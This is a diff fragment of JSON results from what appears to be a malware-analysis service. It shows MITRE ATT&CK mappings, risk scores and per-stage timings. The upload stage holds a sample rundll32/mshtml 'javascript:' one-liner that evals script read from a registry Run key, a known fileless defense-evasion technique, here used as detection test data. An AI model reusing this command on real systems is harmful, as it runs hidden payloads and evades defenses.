+                "tactic": "Lateral Movement",
+                "technique": "SMB/Windows Admin Shares: UNC-path execution via pushd/rundll32"
               },
               {
-                "evidence": "XHR / fetch / ADODB.Stream download.",
-                "evidence_records": [
-                  {
-                    "confidence": "medium",
-                    "event_or_rule": "die.analyzer.T1105",
-                    "evidence_ref": "ev-bdaaee76ee4c",
-                    "field": "analyzer_evidence",
-                    "observed_value": "XHR / fetch / ADODB.Stream download.",
-                    "source": "die.analyzer_catalogue"
-                  }
-                ],
-                "id": "T1105",
-                "rule_family": "die.analyzer_catalogue",
-                "source": "authoritative",
-                "tactic": "Command and Control",
-                "technique": "Ingress Tool Transfer"
+                "id": "T1218.005",
+                "tactic": "Defense Evasion",
+                "technique": "mshta-style javascript:/vbscript: URI fragment"
               }
             ],
-            "mitre_provenance": {
-              "regex_extra": [
-                "T1021.002",
-                "T1218.005",
-                "T1218.011"
-              ],
-              "source": "die.investigation_results",
-              "suppressed_count": 0
-            },
             "osint": null,
             "risk": {
-              "level": "medium",
-              "score": 68,
-              "verdict": "Suspicious"
+              "level": "high",
+              "score": 78,
+              "verdict": "Malicious"
             },
             "ti_hits": [],
             "ti_lookup_meta": {
               "deadline_ms": 500.0,
-              "elapsed_ms": 0.131,
+              "elapsed_ms": 0.099,
               "status": "ok"
             },
             "yara": [
@@ -10000,7 +9378,7 @@
               }
             ]
           },
-          "elapsed_ms": 167.5,
+          "elapsed_ms": 151.7,
           "status": 200
         },
         "die": {
@@ -10436,7 +9814,7 @@
               ]
             }
           },
-          "elapsed_ms": 95.5,
+          "elapsed_ms": 94.7,
           "status": 200
         },
         "narrate": {
@@ -10494,7 +9872,7 @@
               ]
             }
           },
-          "elapsed_ms": 103.1,
+          "elapsed_ms": 90.4,
           "status": 200
         },
         "upload": {
@@ -10522,7 +9900,7 @@
             ],
             "text": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write(\"\\74script language=jscript>eval(new ActiveXObject(\\\"WScript.Shell\\\").RegRead(\\\"HKCU\\\\\\\\software\\\\\\\\microsoft\\\\\\\\windows\\\\\\\\currentversion\\\\\\\\run\\\\\\\\evil\\\"));\\74/script>\")"
           },
-          "elapsed_ms": 99.2,
+          "elapsed_ms": 107.1,
           "status": 200
         }
       }
